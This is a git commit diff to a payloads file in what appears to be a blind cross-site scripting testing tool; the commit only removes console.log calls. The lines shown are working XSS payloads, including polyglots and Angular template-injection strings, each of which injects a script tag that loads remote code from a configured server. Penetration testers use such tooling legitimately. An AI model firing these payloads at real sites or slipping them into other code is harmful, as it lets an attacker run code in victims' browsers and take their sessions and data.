3af564cad5991e38102b6a146861d90691b5a9a1
Lewis <LewisArdern@live.co.uk>
2018-11-09 12:46:08 -0800

    remove console.log

--- server/utilities/payloads.js
+++ server/utilities/payloads.js
@@ -14,8 +14,8 @@ exports.generatePayloads = (config) => {
     { description: 'JavaScript URI', payload: `<input value='javascript:eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")'></br>` },
     { description: 'Port Swigger - BurpSuite Polygot Payload', payload: `/*</script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+((new(Image)).src=((new(Image)).src=([]+/\/${config.url}\/m/).replace(/\\/g,[]))//'>` },
     { description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload', payload: `"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")//>` },
-    { description: 'Mario Heiderch - Angular Payload', payload: `{{constructor.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_);console.log(_)")()}} ` },
-    { description: 'Lewis Ardern/Gareth Heyes - AngularJS Payload', payload: `{{$on.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_);console.log(_)")()}}` },
+    { description: 'Mario Heiderch - Angular Payload', payload: `{{constructor.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")()}} ` },
+    { description: 'Lewis Ardern/Gareth Heyes - AngularJS Payload', payload: `{{$on.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")()}}` },
   ];
   const structured = buildPayloadStructure(payloads);
 
